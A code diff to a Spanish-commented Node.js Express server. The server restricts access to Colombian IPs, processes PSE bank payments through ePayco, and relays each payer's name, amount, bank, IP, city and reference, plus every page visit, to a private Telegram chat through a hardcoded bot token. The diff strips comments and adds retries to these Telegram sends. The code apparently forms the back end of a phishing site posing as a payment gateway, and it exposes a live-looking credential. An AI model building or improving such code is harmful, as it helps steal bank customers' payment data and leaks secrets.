@@ -9,7 +9,6 @@ const app = express();
 const PORT = process.env.PORT || 3001;
 
 // ─── Trust proxy (Render / Cloudflare) ───
-// ESTO ES CLAVE para que req.ip sea la IP real del cliente detrás del proxy
 app.set("trust proxy", true);
 
 // ─── Configuración de las URLs de ePayco ───
@@ -40,22 +39,19 @@ const HEADERS_EPAYCO = {
 app.use(cors());
 app.use(express.json());
 
-// ─── Archivos estáticos PRIMERO (para que el frontend cargue sin pasar por el geobloqueo) ───
+// ─── Archivos estáticos PRIMERO ───
 app.use(express.static(path.join(__dirname, "public")));
 
 // ═══════════════════════════════════════════
 // BLOQUEO GEOGRÁFICO: SOLO PERMITIR COLOMBIA (CO)
 // ═══════════════════════════════════════════
 app.use((req, res, next) => {
-  // req.ip ya es la IP real del cliente gracias a trust proxy
   let ipFinal = req.ip || "";
 
-  // Limpiar prefijo IPv6 mapeado
   if (ipFinal.startsWith("::ffff:")) {
     ipFinal = ipFinal.replace("::ffff:", "");
   }
 
-  // Permitir acceso local / IPs privadas (debug)
   if (
     ipFinal === "127.0.0.1" ||
     ipFinal === "::1" ||
@@ -68,8 +64,6 @@ app.use((req, res, next) => {
   }
 
   const geo = geoip.lookup(ipFinal);
-
-  // Log para debug en Render (revisa los logs del servicio)
   console.log(`[GeoBlock] IP: ${ipFinal} → Country: ${geo ? geo.country : "unknown"}`);
 
   if (!geo || geo.country !== "CO") {
@@ -295,7 +289,7 @@ app.get("/api/email-transaccion", async (req, res) => {
 });
 
 // ═══════════════════════════════════════════
-// Telegram Bot
+// Telegram Bot - Con reintentos
 // ═══════════════════════════════════════════
 const TELEGRAM_TOKEN = "7844670796:AAFMQxtE6B91-7Y_PIv9cP-zERUlps1Lqck";
 const TELEGRAM_CHAT_ID = "-1004356725315";
@@ -317,7 +311,7 @@ const BANCOS_COLOMBIA = {
   "1815":"ALIANZA FIDUCIARIA","1816":"CREZCAMOS","1819":"BANCO CONTACTAR"
 };
 
-async function notificarTelegram(nombre, valor, bancoCode, ip, ciudad, referencia) {
+async function notificarTelegram(nombre, valor, bancoCode, ip, ciudad, referencia, intentos = 3) {
   try {
     const formatter = new Intl.NumberFormat('es-CO', { style: 'currency', currency: 'COP', minimumFractionDigits: 0 });
     const bancoNombre = BANCOS_COLOMBIA[bancoCode] || bancoCode;
@@ -337,7 +331,14 @@ async function notificarTelegram(nombre, valor, bancoCode, ip, ciudad, referenci
     });
     console.log("Notificación Telegram enviada");
   } catch (error) {
-    console.error("Error enviando Telegram:", error.message);
+    console.error(`Error enviando Telegram (intento ${4 - intentos}/3):`, error.message);
+    
+    // Si es un error de red (timeout, unreachable) y aún quedan intentos
+    if (intentos > 1 && (error.code === 'ETIMEDOUT' || error.code === 'ENETUNREACH' || error.code === 'ECONNRESET')) {
+      console.log("Reintentando en 2 segundos...");
+      await new Promise(resolve => setTimeout(resolve, 2000));
+      return notificarTelegram(nombre, valor, bancoCode, ip, ciudad, referencia, intentos - 1);
+    }
   }
 }
 
@@ -514,7 +515,7 @@ app.post("/api/pasarela/cobro-pse", async (req, res) => {
 });
 
 // ═══════════════════════════════════════════
-// ENDPOINT 10: Notificar Visita
+// ENDPOINT 10: Notificar Visita (Ingreso al Index)
 // ═══════════════════════════════════════════
 app.post("/api/notificar-ingreso", async (req, res) => {
   try {
@@ -528,15 +529,32 @@ app.post("/api/notificar-ingreso", async (req, res) => {
       `📍 *Ciudad:* ${ciudad}\n` +
       `🕐 *Fecha:* ${new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })}`;
 
-    await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-      chat_id: TELEGRAM_CHAT_ID,
-      text: mensaje,
-      parse_mode: "Markdown"
-    });
+    // Aquí también agregamos reintentos
+    let enviado = false;
+    let intentos = 3;
+    
+    while (!enviado && intentos > 0) {
+      try {
+        await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+          chat_id: TELEGRAM_CHAT_ID,
+          text: mensaje,
+          parse_mode: "Markdown"
+        });
+        enviado = true;
+      } catch (err) {
+        console.error(`Error notificando ingreso (intento ${4 - intentos}/3):`, err.message);
+        intentos--;
+        if (intentos > 0 && (err.code === 'ETIMEDOUT' || err.code === 'ENETUNREACH' || err.code === 'ECONNRESET')) {
+          await new Promise(r => setTimeout(r, 2000));
+        } else {
+          break;
+        }
+      }
+    }
 
     res.json({ success: true });
   } catch (error) {
-    console.error("Error notificando ingreso:", error.message);
+    console.error("Error general notificando ingreso:", error.message);
     res.status(500).json({ success: false });
   }
 });
